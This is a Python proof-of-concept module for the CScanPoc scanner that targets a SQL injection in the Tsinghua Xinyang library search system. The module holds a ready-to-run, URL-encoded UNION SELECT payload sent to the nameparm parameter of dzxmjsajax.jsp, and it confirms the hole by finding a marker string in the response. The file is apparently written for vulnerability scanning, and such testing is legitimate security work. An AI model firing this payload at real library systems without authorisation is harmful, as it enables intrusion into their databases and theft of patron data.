# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Infosea_0003'  # 平台漏洞编号，留空
    name = '清大新洋图书检索系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-12-04'  # 漏洞公布时间
    desc = '''
        清大新洋图书系统 
        /ggjs/dzxx/dzxmjsajax.jsp
        参数过滤不完整，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=085319、082667、079840、014662'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '清大新洋'  # 漏洞应用名称
    product_version = '清大新洋图书检索系统'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '85441c01-1db0-40e0-b403-5cf40820409c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # refer:http://www.wooyun.org/bugs/wooyun-2010-085319
            # refer:http://www.wooyun.org/bugs/wooyun-2010-082667
            # refer:http://www.wooyun.org/bugs/wooyun-2010-079840
            # refer:http://www.wooyun.org/bugs/wooyun-2010-014662
            hh = hackhttp.hackhttp()
            payload = '/ggjs/dzxx/dzxmjsajax.jsp?nameparm=1'
            getdata = '%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CCHR%28113%29%7C%7CCHR%28118%29%7C%7CCHR%28122%29%7C%7CCHR%2898%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%2885%29%7C%7CCHR%28122%29%7C%7CCHR%28101%29%7C%7CCHR%2899%29%7C%7CCHR%28114%29%7C%7CCHR%28120%29%7C%7CCHR%2871%29%7C%7CCHR%2875%29%7C%7CCHR%2870%29%7C%7CCHR%28113%29%7C%7CCHR%28106%29%7C%7CCHR%28120%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20DUAL--'
            url = self.target + payload + getdata
            code, head, res, errcode, _ = hh.http(url)

            if 'qvzbqxUzecrxGKFqjxkq' in res:
                #security_hole(arg+payload+'   :found sql Injection')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
